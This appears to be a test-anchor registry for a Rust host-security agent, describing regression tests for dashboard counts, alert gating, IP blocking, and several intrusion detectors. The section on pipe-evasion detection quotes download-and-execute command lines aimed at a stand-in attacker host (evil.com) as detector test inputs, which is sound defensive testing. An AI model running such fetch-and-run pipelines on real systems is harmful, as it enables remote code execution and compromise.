- `crates/agent/src/dashboard/canonical_counts.rs::tests::canonical_counts_reads_events_today_from_sqlite_per_date_not_kg_counter` — PR30 source-pin: events_today must come from `Store::events_count_for_date(date)` (per-date SQLite). NOT `graph.total_events_ingested` (process-lifetime, off by ~35× on week-old uptime), NOT `metrics.edge_count` (~30× inflated), NOT `count_file_lines` (JSONL sinks removed in spec 016). PR22 originally pinned `total_events_ingested`; PR28 fixed `/api/overview` to SQLite; PR30 made the canonical module match production.

- `crates/agent/src/dashboard/canonical_counts.rs::tests::resolve_events_today_returns_sqlite_value_on_ok_arm` — PR30 helper unit: the Ok arm of the events_today decision returns SQLite's per-date number verbatim, even when the KG counter is large (1M). Pins that the process-lifetime counter never leaks through the happy path.

- `crates/agent/src/dashboard/canonical_counts.rs::tests::resolve_events_today_falls_back_to_kg_counter_on_err_arm` — PR30 helper unit: the Err arm surfaces `graph.total_events_ingested` so the operator sees SOME signal during degraded operation (corrupt DB / schema mismatch). Drives an actual synthetic `StoreError` — pre-refactor the contract was un-exercised because driving a real store to return Err requires filesystem mischief.

- `crates/agent/src/dashboard/canonical_counts.rs::tests::canonical_counts_happy_path_with_empty_sqlite_reports_zero_not_kg_counter` — PR30 end-to-end happy path: with SQLite reachable and empty, canonical compute() returns 0, NOT the KG counter's value (42). A future refactor that re-introduces "graph.total_events_ingested as a fallback when SQLite returns 0" fails here.

- `crates/agent/src/dashboard/sensors.rs::tests::build_sensors_payload_uses_canonical_when_threaded` — PR30 match-arm pin: when a canonical events_today is threaded (Some(13)), the HUD reports 13 even when the KG counter is 1M. The bug PR30 was created to kill manifests as the KG counter leaking past the threaded canonical.

- `crates/agent/src/dashboard/sensors.rs::tests::build_sensors_payload_falls_back_to_kg_counter_when_canonical_none_and_graph_has_data` — PR30 degraded-mode pin for the sensors surface: when canonical is None (no SQLite store reachable) and the KG counter has data (555), the HUD surfaces 555 as best-effort. /api/overview uses the same fallback in its `events_count_fallback` path, so the two surfaces still agree even in degraded mode.

- `crates/agent/src/dashboard/mod.rs::tests::threats_kpi_tile_label_is_blocks_not_blocked` (extended in Wave 10) - the Threats KPI tile reads "Block actions" / "today" (aggregate, decisions) and the sidebar group reads "Currently blocked attackers" (snapshot, unique IPs). Pre-Wave-10 the labels read "Blocks · Today" and "Blocked attackers" — same page, different answers, no copy disclosing the snapshot-vs-aggregate axis. Operator's hard rule (2026-05-05): every label must explicitly disclose window + scope + cardinality unit. The test name predates Wave 10 (kept for git-blame continuity); the docstring has been updated to reflect the new disambiguation pair.
- `crates/agent/src/dashboard/mod.rs::tests::wave10_live_feed_clips_to_rolling_24h_matching_site_label` - the public live-feed builder (`build_live_feed_response`) clips `real_incidents` to `now - 24h` so the site's hardcoded "(24h)" labels (`Live.tsx:415,422,429`) match the underlying data. Source-grep anchor: pins `cutoff_24h = now - chrono::Duration::hours(24)` AND `i.ts >= cutoff_24h` filter in active code. A future "remove the cutoff for performance" PR fails CI loudly.

### Notification noise + Top-5 leftovers (AUDIT-NOISE-A / NOISE-B / WAVE-T5-3 / WAVE-T5-4)

- `crates/agent/src/notification_gate.rs::tests::compromise_contained_defers_to_daily_briefing` - Bug A anchor: compromise + contained MUST NOT trigger SendNow; defer to the daily briefing. Pre-fix the operator received 3 Critical Telegram pings for the same `kill_chain:detected:DATA_EXFIL` incident even though killchain inline had already auto-blocked the IP. Anti-regression for re-promoting "compromise alone → SendNow".
- `crates/agent/src/notification_gate.rs::tests::compromise_uncontained_sends` - Bug A counter-anchor: real compromise that is NOT contained still SendNow. A future "always defer compromise" refactor must NOT silently suppress unblocked compromise alerts.
- `crates/agent/src/notification_gate.rs::tests::contract_full_precedence_table` - Bug A precedence-table anchor: pins the full Cartesian (compromise, active, contained, probe) → verdict matrix in one place. The compromise+contained row IS the Bug A fix; the rest are anti-regression bounds for the surrounding rules.
- `crates/agent/src/notification_pipeline.rs::tests::self_traffic_loopback_ip_is_suppressed_from_grouping` - Bug B anchor: incidents whose primary entity is `127.0.0.1` (IPv4 loopback) are suppressed from the grouping engine. Pre-fix the operator received daily briefings reading "🟠 4 dns_tunneling from 127.0.0.1".
- `crates/agent/src/notification_pipeline.rs::tests::self_traffic_ipv6_loopback_is_suppressed_from_grouping` - Bug B anchor (IPv6): `::1` is also self-traffic. Anti-regression for dropping the IPv6 path in `is_self_traffic_entity`.
- `crates/agent/src/notification_pipeline.rs::tests::external_attacker_ip_still_creates_grouping_entry` - Bug B anti-regression bound: real external attackers (TEST-NET-3 `203.0.113.42`) still create groups. Defends against accidentally widening the self-traffic filter to public IPs and silently dropping every alert.
- `crates/agent/src/ai/local_classifier.rs::tests::block_ip_skill_id_uses_operator_configured_backend_iptables` - Top-5 #3 anchor: the classifier emits `skill_id="block-ip-iptables"` when the operator configured `block_backend = "iptables"`. Pre-fix the classifier was the only auto-block site that hardcoded `block-ip-ufw`, ignoring `cfg.responder.block_backend`; on a host running iptables / nftables / pf the executor would either reject the skill or run ufw in parallel.
- `crates/agent/src/ai/local_classifier.rs::tests::block_ip_skill_id_uses_operator_configured_backend_nftables` - Top-5 #3 anchor (nftables variant).
- `crates/agent/src/ai/local_classifier.rs::tests::block_ip_skill_id_uses_operator_configured_backend_pf` - Top-5 #3 anchor (pf variant; macOS / BSD operators).
- `crates/agent/src/ai/local_classifier.rs::tests::block_ip_skill_id_uses_operator_configured_backend_xdp` - Top-5 #3 anchor (xdp variant; production prod backend on the live server).
- `crates/agent/src/loops/boot.rs::tests::build_primary_provider_accepts_iptables_backend_signature` - Top-5 #3 plumbing anchor: the boot-layer `build_primary_provider(cfg, block_backend)` call shape. Pre-fix the function signature did not even accept `block_backend`. Pins the call shape so a future revert that drops the parameter would fail CI before the deeper classifier-side anchors ever run.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::dispatch_failed_report_preserves_daily_quota_and_dedup` - Top-5 #4 headline anchor: HTTP failure (`report_fn` returns `false`) MUST NOT increment the daily counter and MUST NOT write the dedup entry; `dropped_failed` reflects the failure and the same IP is retryable on the next flush. Pre-fix `commit.apply()` always ran and a 5xx from AbuseIPDB permanently consumed one slot of the operator's daily 800 quota.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::dispatch_successful_report_consumes_daily_quota_and_dedup` - Top-5 #4 success-path anchor: HTTP success advances the counter and writes the dedup entry. Anti-regression for an over-eager "skip commit" refactor that would also suppress success.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::dispatch_mixed_success_and_failure_only_commits_successes` - Top-5 #4 mixed-batch anchor: in a 3-item burst with one HTTP failure in the middle, only the two successes consume slots and write dedup entries; the failed IP remains retryable. Pins per-item commit isolation.

### Agent-guard pipe absolute-path evasion (Top-5 #5 - AUDIT-WAVE-T5-5)

- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_with_absolute_path_executor_bin_bash` - Top-5 #5 headline anchor: `curl http://evil.com/x | /bin/bash` MUST trip the detector. Pre-fix the executor check used `w.trim_start_matches("./") == *e`, normalising only the relative `./bash` form; absolute paths slipped through string equality. PR #456 (Wave 2) closed the pipe-reorder evasion; this anchor closes the absolute-path evasion that was still wide open in the same Top-5 finding.
- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_with_absolute_path_executor_usr_bin_python` - same pattern for `/usr/bin/python`. Pins that the basename normalisation is symmetric across every entry in `EXECUTORS`, not specific to bash.
- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_with_absolute_path_executor_unusual_prefix` - `/system/bin/sh` (Android-style prefix). Anti-regression for accidentally hardcoding `/bin/` / `/usr/bin/` instead of "anything before the last slash".
- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_combining_pipe_reorder_and_absolute_path` - layered evasion: downloader in middle segment (Wave 2 territory) + absolute-path executor (this fix). Pins that the two fixes compose correctly so `ls | curl http://evil.com/x | /bin/bash -c id` still trips.
- `crates/agent-guard/src/threats.rs::tests::does_not_detect_path_lookalike_words` - anti-regression bound: `curl ... | /bin/foo` MUST NOT trip. The basename strip operates on `/`, not on a similarity widening; only basenames in `EXECUTORS` count.
- `crates/agent-guard/src/threats.rs::tests::does_not_detect_executor_substring_inside_word` - anti-regression bound: `bashfoo` and `/usr/bin/bashfoo` MUST NOT trip. Basename comparison is exact equality, not substring containment, so attacker-named binaries like `bashfoo` cannot exploit a weakened comparison.
- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_with_executor_first_arg_after_basename` - `/bin/bash -c 'whoami'` shape: pins that `split_whitespace().next()` is what gets basename-checked, so executor + args still trips. Anti-regression for accidentally checking the LAST whitespace token instead of the first.

### KG-derived decide modifier (Spec 043 Phase 1 - AUDIT-SPEC043-PHASE1)

- `crates/agent/src/kg_decide_features.rs::tests::extract_features_from_fixture_graph` - the headline anchor: feature extraction over a fixture KG with one IP node + 5 benign + 2 malicious incidents (all within the 7d window) yields `prior_incidents_24h=7`, `risk_score=12`, `first_seen_age_days=45`, and `benign_history_score ≈ 5/7 ≈ 0.714`. Pins the math + the field-extraction contract; future schema change (e.g. renaming `false_positive` field on Node::Incident) fails CI.
- `crates/agent/src/kg_decide_features.rs::tests::compute_modifier_benign_history_yields_negative` - the strongest benign band (`-0.30`) requires ALL FOUR sub-conditions (history>=0.90, risk<20, age>=30d, no recent activity). Anti-regression for loosening any one and silently increasing FN rate.
- `crates/agent/src/kg_decide_features.rs::tests::compute_modifier_aggressive_attacker_yields_positive` - the strongest malicious band (`+0.20`) requires BOTH campaign-cluster membership AND low benign history. Anti-regression for triggering on campaign membership alone (would over-block legit IPs that happen to share a CIDR with attackers).
- `crates/agent/src/kg_decide_features.rs::tests::critical_severity_floor_holds` - Critical incidents NEVER receive a negative modifier even when `benign_history >= 0.90`. Defensive layering with Spec 043 Phase 7 (FP suppression). Anti-regression for accidentally suppressing real Critical compromise alerts on entities that look pristine on paper.
- `crates/agent/src/kg_decide_features.rs::tests::would_change_action_detects_threshold_crossings_only` - the operator-scrutiny boolean fires only when confidence crosses the 0.85 auto-execute boundary, not on within-band wiggle. Pins what counts as "operationally significant" in the shadow log.
- `crates/agent/src/kg_decide_features.rs::tests::parse_mode_unknown_string_falls_back_to_off` - typoed config values (`"enfocre"`, `""`, `"typo"`) collapse to `Off` rather than panicking. The agent must boot even when the operator misspells the mode string. Anti-regression for accidentally bailing out on the parse failure (which would refuse to start with a typo in the config).
- `crates/agent/src/kg_decide_features.rs::tests::write_shadow_log_writes_jsonl_with_expected_schema` - shadow log file is `kg_shadow_decide_modifier_<YYYY-MM-DD>.jsonl` AND contains `incident_id`, `modifier_after_floor`, `would_change_action` fields. Pins the operator-facing schema so a future "rotate format" PR must update both the writer and operator's downstream `jq` parsers.
- `crates/agent/src/incident_decision_eval.rs::tests::kg_decide_modifier_shadow_mode_logs_but_does_not_apply` - end-to-end integration: with `[kg].decide_modifier_mode = "shadow"`, a benign-history entity does NOT receive the `[kg: ...]` reason tag (mutation marker) AND the shadow log file IS written. Pins the shadow-vs-enforce contract at the integration layer; promotion to enforce requires this assertion to flip in a deliberate config change.
- `crates/agent/src/incident_decision_eval.rs::tests::kg_decide_modifier_enforce_mode_applies_modifier` - end-to-end integration: with `[kg].decide_modifier_mode = "enforce"`, baseline confidence 0.90 + (-0.30 modifier from long-tenure benign band) → 0.60, AND `decision.reason` gains the `[kg: benign=..., risk=..., age=..., modifier=...]` audit suffix. Anti-regression for breaking the suffix format (operator's audit-log grep depends on it).
- `crates/agent/src/incident_decision_eval.rs::tests::kg_decide_modifier_critical_severity_floor_holds` - end-to-end integration of the Critical floor: the SAME entity + SAME baseline as the enforce test, but with `severity = Critical`, MUST keep confidence at baseline (no `[kg: ...]` tag added because the post-floor modifier is exactly 0.0). Anti-regression for the most dangerous failure mode of this whole spec — silently suppressing a real Critical compromise alert on an entity that has a pristine 60-day history.
- `crates/agent/src/incident_decision_eval.rs::tests::correlation_disabled_skips_cross_detector_boost` - coverage anchor for `correlation.enabled = false` early return: a primed correlator with TWO distinct detectors firing on the same IP (which would normally yield a `[correlated: ...]` tag) MUST leave `decision.reason = "baseline"` and `decision.confidence` unchanged when correlation is disabled in config. Pins the toggle contract — a regression that ignores the flag and always boosts would silently re-enable correlation on hosts that explicitly opted out.
- `crates/agent/src/incident_decision_eval.rs::tests::attacker_profile_high_risk_boosts_confidence_and_tags_reason` - coverage anchor for the legacy `attacker_profiles` sidecar boost: a profile with `risk_score=100` boosts `confidence` by exactly `(100-50)/500 = 0.10` and tags the reason with `[intel: risk 100, regular_scanner, 7 visits]`. Pins the formula AND the tag shape (operators grep for `[intel: risk` in audit logs); a regression that drops the tag silently demotes a known-attacker decision to AI baseline.
- `crates/agent/src/incident_decision_eval.rs::tests::anomaly_score_above_threshold_boosts_confidence_and_tags_reason` - coverage anchor for the autoencoder agreement path: `latest_anomaly_score = 1.0` with baseline `0.5` yields `0.5 + (1.0 - 0.7) * 0.33 = 0.599` and tags the reason with `[neural: 100% anomaly]`. Pins the boost formula, the take-on-consume contract, and the operator-facing tag — all three matter for distinguishing "AI alone said block" vs "AI + anomaly engine agreed" in the post-incident review.
- `crates/agent/src/incident_decision_eval.rs::tests::kg_decide_modifier_off_mode_is_full_noop` - coverage anchor for `decide_modifier_mode = "off"` rollback contract: even with a fully-seeded benign-history KG and a baseline=0.90 decision, the function MUST early-return BEFORE acquiring the read lock or computing features, leave `confidence` and `reason` untouched, AND must NOT create the shadow log file. Pins the operator's rollback-without-redeploy contract — a regression that creates an empty shadow log even in off-mode would leak the existence of the spec-043 path to filesystem-watching tooling and confuse the promotion gate's "non-zero would_change_action" check.

### Deep `/ask` context (Spec 043 Phase 2 - AUDIT-SPEC043-PHASE2)

- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_includes_ip_risk_and_datasets` - Phase 2 headline anchor: `ask_context_deep` surfaces `Ip.risk_score` AND `Ip.datasets` (threat-intel feeds) on the RECENT INCIDENTS section. Pre-Phase-2 these fields were write-only in the KG (operator-reported "/ask responde muito basico"). The LLM now sees real ground truth, not just titles.
- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_pulls_subgraph_when_question_mentions_ip` - when the operator's question contains a dotted-quad that matches an Ip node, a depth-1 SUBGRAPH FOR QUESTION section is attached (renders neighbors as `<-[Relation]- Node(label)`). Pins that "why is X.X.X.X blocked?" gets grounded in graph topology, not just hallucinated narrative.
- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_respects_budget_cap_drops_subgraph_first` - under tight char budget, SUBGRAPH section is dropped FIRST (most expendable) so RECENT INCIDENTS (highest signal) survives. Anti-regression for accidentally dropping incidents to fit subgraph, which would degrade /ask quality on memory-constrained runs.
- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_empty_graph_returns_empty_string` - empty KG produces empty string (no dangling section headers). Pins the same defensive contract as the legacy `graph_last_incidents_raw` helper had.

### Direct-block KG modifier coverage (Spec 043 Phase 1b - AUDIT-SPEC043-PHASE1B)

- `crates/agent/src/correlation_response.rs::tests::phase_1b_repeat_offender_path_invokes_kg_decide_modifier` - Phase 1b headline anchor: `apply_kg_decide_modifier` MUST be called between the repeat-offender `AiDecision` construction and `execute_decision`. Pre-Phase-1b the KG modifier hook fired only on the AI-router decide path, which prod evidence (2026-05-06) shows accounts for <5% of actual block decisions; the bulk flowed through `repeat-offender:*` direct-blocks that bypassed the AI router entirely. The shadow log filled in days instead of minutes. Source-grep anchor — drop the call and the slow-fill regression returns silently.
- `crates/agent/src/correlation_response.rs::tests::phase_1b_multi_technique_path_invokes_kg_decide_modifier` - mirror anchor for the `multi-technique:*` direct-block path. Same rationale.
- `crates/agent/src/correlation_response.rs::tests::phase_1b_completed_chain_path_invokes_kg_decide_modifier` - mirror anchor for the `correlation:*` (completed attack chain) direct-block path. Three direct-block sites in `correlation_response.rs` total; all three pinned independently so a future refactor that drops any one is caught.

### CDN-noise dashboard suppression (Spec 043 Phase 3 - AUDIT-SPEC043-CDN-NOISE)

- `crates/agent/src/incident_autodismiss.rs::tests::try_dismiss_cdn_noise_dismisses_cloudflare_edge` - headline anchor: a `proto_anomaly:SlowConnection:172.71.95.141:*` incident (the exact prod failure shape — 24 of 25 dashboard "needs attention" entries on 2026-05-06 were CF edges) MUST be auto-dismissed. Wave 9 (PR #469) covered the HTTP-layer attribution; this companion fix handles the network-layer noise where there's no HTTP header to read.
- `crates/agent/src/incident_autodismiss.rs::tests::try_dismiss_cdn_noise_dismisses_aws_edge` - mirror anchor for AWS — pins that the suppression uses the broader `cloud_safelist::identify_provider` (which covers CF/AWS/Azure/GCP/OCI/DO/Hetzner) rather than CF-only. A future refactor that narrows back to CLOUDFLARE_RANGES would silently break AWS/Azure CDN-edge suppression.
- `crates/agent/src/incident_autodismiss.rs::tests::try_dismiss_cdn_noise_does_not_dismiss_real_attacker_ip` - anti-regression bound: real attacker IPs (TEST-NET-3 `203.0.113.42`) MUST stay in "needs attention". The whole point of the suppression is to remove CDN noise without losing real attacker visibility.
- `crates/agent/src/incident_autodismiss.rs::tests::try_dismiss_cdn_noise_does_not_touch_other_detectors` - anti-regression bound: `data_exfil_ebpf` / `kill_chain` / `reverse_shell` on a CDN edge IP MUST still surface. Only `proto_anomaly` is in `CDN_NOISY_DETECTORS` — those carry actual exploitation evidence and must not be silenced just because the source happens to be a CDN edge.

### YARA match detector (Spec 043 Phase 3 - AUDIT-SPEC043-PHASE3)

- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::yara_match_detector_emits_incident_when_yara_match_present` - Phase 3 headline anchor: a File node with non-empty `yara_matches` produces exactly one High incident. Pre-Phase-3 the YARA scanner wrote match-rule names onto File nodes but no consumer ever read them — every match was silently dropped, even on real hits like Cobalt Strike / XMRig / webshells from `rules/yara/*.yml`.
- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::yara_match_detector_emits_nothing_when_yara_matches_empty` - anti-regression bound: a File node with EMPTY `yara_matches` MUST NOT produce an incident. The detector activates a write-only field; it must not spam every File node in the graph.
- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::yara_match_detector_emits_one_incident_per_file_for_multiple_matches` - aggregation anchor: a single binary that matched 3 YARA rules produces ONE incident (not 3), with all rule names in the summary. Anti-regression for accidentally emitting one-per-rule (would 3x operator alert volume on hits like `xmrig_miner + packed_upx + cryptominer_generic`).

### Sysctl drift detector (Spec 043 Phase 5 - AUDIT-SPEC043-PHASE5)

- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::sysctl_drift_first_observation_emits_nothing_just_baselines` - defensive contract: the first observation has no baseline to diff against; detector MUST emit zero incidents and just snapshot. Anti-regression for accidentally treating "first sight" as "all params drifted from /unset/" and spamming hundreds of false positives.
- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::sysctl_drift_critical_param_change_emits_critical` - Phase 5 headline anchor: `kernel.kptr_restrict` relaxed from `2` to `0` (the rootkit pointer-hiding bypass) emits a Critical incident with the param name in title and old/new values in summary. Pre-Phase-5 the sensor wrote sysctl_params onto System nodes but no consumer diffed them — real rootkits flip these to hide themselves and the signal was invisible.
- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::sysctl_drift_medium_class_aggregates_into_one_incident` - aggregation anchor: 5 non-critical params drifting in one tick produce ONE Medium incident with all 5 in the summary, not 5 separate incidents. Anti-regression for accidentally flooding the dashboard on a benign system-wide tunable refresh (e.g. `sysctl --system` after editing /etc/sysctl.d).
- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::sysctl_drift_no_change_emits_nothing` - anti-regression bound: when the System node is unchanged tick-over-tick, detector MUST emit zero incidents. Pre-aggregation a buggy "always emit on every observation" implementation would have flooded the dashboard at 30s intervals.
- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::sysctl_drift_does_not_re_emit_same_change_on_next_tick` - operator-facing rule anchor: a single intentional change (operator editing /etc/sysctl.d) produces ONE alert, not one per slow-loop tick. Detector updates baseline to current after each emit so the same drift is not surfaced again.

### CDN-noise KG-history hardening (Spec 043 Phase 5 follow-up - AUDIT-SPEC043-CDN-HARDENING)

- `crates/agent/src/incident_autodismiss.rs::tests::try_dismiss_cdn_noise_does_not_dismiss_when_ip_has_other_recent_attack_history` - operator's safety case (2026-05-06: "não podemos ficar vulneráveis a alguém nos invadir usando a Azure"): an Azure / AWS / GCP / OCI / DO / Hetzner IP that has a non-`proto_anomaly` incident in the last 24h (e.g. ssh_bruteforce) MUST NOT have its proto_anomaly auto-dismissed. The initial Phase 3 fix would have silently silenced the noisy half of a real attack on a cloud VM. Hardening uses `kg_decide_features::incidents_24h_excluding_detectors` to check KG history before dismiss.

### Packed binary detector (Spec 043 Phase 4 - AUDIT-SPEC043-PHASE4)

- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::packed_binary_detector_emits_when_high_entropy_and_executed` - Phase 4 headline anchor: a File with entropy 7.8 (above 7.5 threshold) AND an Executed edge produces ONE Medium incident. Pre-Phase-4 the sensor wrote Shannon entropy onto File nodes but no consumer read it. Activates the field for the exact UPX-packed-dropper shape.
- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::packed_binary_detector_skips_high_entropy_when_not_executed` - anti-regression bound: a high-entropy file with NO Executed edge is suspicious-on-disk but not actionable for THIS detector. Pre-fix would have spammed every random-looking file in /var/cache.
- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::packed_binary_detector_skips_legit_low_entropy_executed_binary` - anti-regression bound: a legit ELF binary (entropy ~6.0) that ran on the host MUST NOT trigger. Otherwise every /usr/bin tool would fire.
- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::packed_binary_detector_respects_configurable_threshold` - threshold knob anchor: entropy 7.0 fires when threshold=6.5 but NOT when threshold=7.5 (default). Pins the operator's tuning surface for unusual workloads.

### Short-lived process detector (Spec 043 Phase 6 - AUDIT-SPEC043-PHASE6)

- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::short_lived_process_detector_emits_when_subms_and_external_connect` - Phase 6 headline anchor: a 50ms process that connected to an external IP fires Medium. Pre-Phase-6 the sensor wrote start_ts/exit_ts but no consumer measured the lifetime. Exact shape of a shellcode loader (loader → connect → exfil → exit).
- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::short_lived_process_detector_skips_when_lifetime_above_threshold` - anti-regression: a 500ms process (above default 100ms) MUST NOT trigger. Real long-lived tools shouldn't fire.
- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::short_lived_process_detector_skips_when_only_internal_connect` - anti-regression: a fast process that connected ONLY to localhost / RFC1918 (health check) MUST NOT trigger. Network I/O alone isn't suspicious; EXTERNAL network I/O during a sub-100ms lifetime is.
- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::short_lived_process_detector_skips_when_no_exit_ts` - defensive bound: a process still running (no exit_ts) MUST NOT trigger. We only know a process is "short lived" once it has actually exited.

### CDN coverage extension — Akamai / Fastly / CloudFront (operator question 2026-05-06)

- `crates/agent/src/cloud_safelist.rs::tests::akamai_edge_detected` - operator's safety question anchor ("se fosse Akamai funcionaria também?"): Akamai's major edge allocations (`23.0.0.0/12`, `23.32.0.0/11`, `104.64.0.0/10`, `184.24.0.0/13`) are recognised by `is_cloud_provider_ip` AND labeled "Akamai" by `identify_provider`. Pre-fix Akamai edge IPs would have escaped the CDN-noise suppression added in PR #475 + the cloud-history hardening added in PR #476, leaving the same noise pattern as Cloudflare had pre-Wave 9.
- `crates/agent/src/cloud_safelist.rs::tests::fastly_edge_detected` - mirror anchor for Fastly (`151.101.0.0/16` is the most common Fastly /16; `199.232.0.0/16`, `146.75.0.0/17` cover the rest).
- `crates/agent/src/cloud_safelist.rs::tests::cloudfront_specific_edge_detected` - mirror anchor for CloudFront prefixes that fall OUTSIDE the standard AWS 3/13/15/18/44/52/54/99 allocations (`64.252.x`, `130.176.x`, `143.204.x`, `144.220.x`). These would have escaped the existing AWS coverage; pinned so a future "AWS catches all" simplification doesn't drop them.
- `crates/agent/src/cloud_safelist.rs::tests::cdn_coverage_does_not_widen_to_real_attackers` - anti-regression bound: TEST-NET-3 / TEST-NET-2 / TEST-NET-1 (RFC 5737) and random non-CDN allocations MUST still be detected as non-cloud. Adding 30+ CDN entries to `CLOUD_PROVIDER_RANGES` must not accidentally swallow real attacker territory.

### Phase 1 maturity tweaks (Spec 043 - 2026-05-06 follow-up)

- `crates/agent/src/kg_decide_features.rs::tests::dismissed_incident_counts_as_benign_regardless_of_severity` - operator-data-driven tweak (after 22 shadow records all "no actionable signal" in 12h prod): a Medium incident with `decision = Some("dismiss")` MUST count as benign in `benign_history_score`. Pre-tweak the agent's own dismiss decisions were poisoning the benign-history signal — CDN edges and package mirrors that repeatedly triggered Medium proto_anomaly that got auto-dismissed counted as malicious history, blocking the IP from ever reaching the `>= 0.75` band.
- `crates/agent/src/kg_decide_features.rs::tests::undismissed_medium_incident_still_counts_as_malicious` - mirror anti-regression: incident with NO decision and severity=Medium continues to count as malicious. Anti-regression for accidentally widening "benign" to every Medium incident, which would let real attackers reach high benign_history_score.
- `crates/agent/src/kg_decide_features.rs::tests::compute_modifier_strongest_band_triggers_at_age_seven_days` - tweak 2 anchor: the `-0.30` band now triggers at `age_days >= 7` (was 30). 30d was unrealistic in prod due to agent restarts and KG retention windows; 8-day age now qualifies (with the rest of the band's preconditions).
- `crates/agent/src/kg_decide_features.rs::tests::compute_modifier_strongest_band_does_not_trigger_below_seven_days` - mirror anti-regression: 6-day age (still below the new 7d threshold) does NOT qualify. Anti-regression for accidentally lowering threshold to zero.

### KG-based FP suppression (Spec 043 Phase 7 - AUDIT-SPEC043-PHASE7)

- `crates/agent/src/kg_fp_suppression.rs::tests::high_benign_history_returns_high_likelihood` - Phase 7 headline anchor: an entity with overwhelming benign history (100 dismissed-Medium + 1 malicious) yields likelihood ≈ 0.69 (history * 0.70 weighting). Pins the math: history_score is the bulk of the signal, FP-edge bonus is the lift to the suppress band.
- `crates/agent/src/kg_fp_suppression.rs::tests::critical_severity_always_passes_through` - the most dangerous failure mode of the whole spec: even with likelihood = 1.0, a Critical incident MUST PassThrough. Hard-coded floor in `classify`. Anchor pins this — if a future refactor relaxes Critical, this fails CI loudly. Operator wants visibility on active-compromise indicators (kill chain, reverse shell, ransomware, data exfil) regardless of historical benign signal.
- `crates/agent/src/kg_fp_suppression.rs::tests::high_severity_above_threshold_is_suppressed` - mirror anchor proving the Critical floor isn't accidentally hiding everything: High severity at likelihood 0.85 + threshold 0.80 DOES suppress. Validates the `(likelihood >= threshold) AND (severity != Critical)` contract.
- `crates/agent/src/kg_fp_suppression.rs::tests::below_threshold_passes_through` - anti-regression bound: incidents below threshold pass through regardless of severity. Pins the threshold check at the right boundary.
- `crates/agent/src/kg_fp_suppression.rs::tests::fp_edge_bonus_caps_at_zero_thirty` - operator-FP-flag spree protection: 5 false_positive=true incidents cap their bonus contribution at 0.30 even though the per-incident contribution is 0.10. Without the cap, a single operator FP-flag spree could unilaterally flip suppression.
- `crates/agent/src/kg_fp_suppression.rs::tests::no_ip_entity_returns_zero_likelihood` - fail-safe contract: an incident with no IP entity returns likelihood = 0.0 → PassThrough. Anti-regression for accidentally suppressing malformed incidents.
- `crates/agent/src/kg_fp_suppression.rs::tests::parse_mode_unknown_collapses_to_off` - typo'd / empty config strings collapse to `Off` rather than panicking. Mirror of `kg_decide_features::parse_mode`'s contract.
- `crates/agent/src/kg_fp_suppression.rs::tests::write_shadow_log_writes_jsonl_with_expected_schema` - shadow log file is `kg_shadow_fp_suppression_<YYYY-MM-DD>.jsonl` AND contains `incident_id`, `fp_likelihood`, `action`, `would_change_action`, `real_severity` fields. Pins the operator-facing schema so a future "rotate format" PR must update both the writer and operator's downstream `jq` parsers.
- `crates/agent/src/process/incidents.rs::tests::try_kg_fp_suppression_off_mode_is_noop` - wiring layer anchor: `mode = "off"` early-returns false and writes neither shadow log nor decision. Pins the rollback path — operator must be able to disable Phase 7 via config push without redeploy.
- `crates/agent/src/process/incidents.rs::tests::try_kg_fp_suppression_shadow_mode_logs_but_does_not_handle` - wiring layer anchor: shadow mode writes JSONL log AND returns false (no suppression in JSONL decisions). Anti-regression for accidentally writing the dismiss decision in shadow.
- `crates/agent/src/process/incidents.rs::tests::try_kg_fp_suppression_enforce_mode_writes_dismiss_for_high_likelihood` - wiring layer anchor: enforce mode + likelihood >= threshold + non-Critical writes dismiss decision tagged `ai_provider = "kg-fp-suppression"` AND returns true (handled). Pins the operator-facing audit-trail label.
- `crates/agent/src/process/incidents.rs::tests::try_kg_fp_suppression_critical_severity_never_suppressed_via_wiring` - wiring layer Critical floor anchor: even at likelihood = 1.0 in enforce mode, Critical severity returns false. Mirror of the pure-helper anchor — defends both layers in case one regresses.
- `crates/agent/src/process/incidents.rs::tests::try_kg_fp_suppression_enforce_mode_passthrough_for_low_likelihood` - wiring layer anchor: enforce mode + IP not in KG (likelihood = 0.0) returns false (PassThrough). Pins the no-handle path so a future refactor that defaults likelihood to >0 doesn't accidentally suppress unknown IPs.

### Honeypot AbuseIPDB-gate KG audit helper (Spec 043 Phase 1b follow-up — scaffolding)

- `crates/agent/src/honeypot_always_on.rs::tests::kg_audit_features_for_block_returns_none_when_kg_absent` - sync anchor for the `kg = None` branch of the audit helper. Pins the no-KG short-circuit so a future caller wiring up the audit hook can rely on it.
- `crates/agent/src/honeypot_always_on.rs::tests::kg_audit_features_for_block_returns_none_for_unknown_ip` - sync anchor: KG present, IP not yet a node returns `None`. Pins the defensive contract that an unknown IP yields no log spam.
- `crates/agent/src/honeypot_always_on.rs::tests::kg_audit_features_for_block_returns_features_for_known_ip` - sync anchor: IP seeded as `Node::Ip` with a 10-day-old `first_seen` returns features carrying the seeded `risk_score` and a non-zero `first_seen_age_days`. Pins the field-level contract that a future `tracing::info!` audit log will consume.

### Dashboard mod.rs surface helpers (coverage anchors)

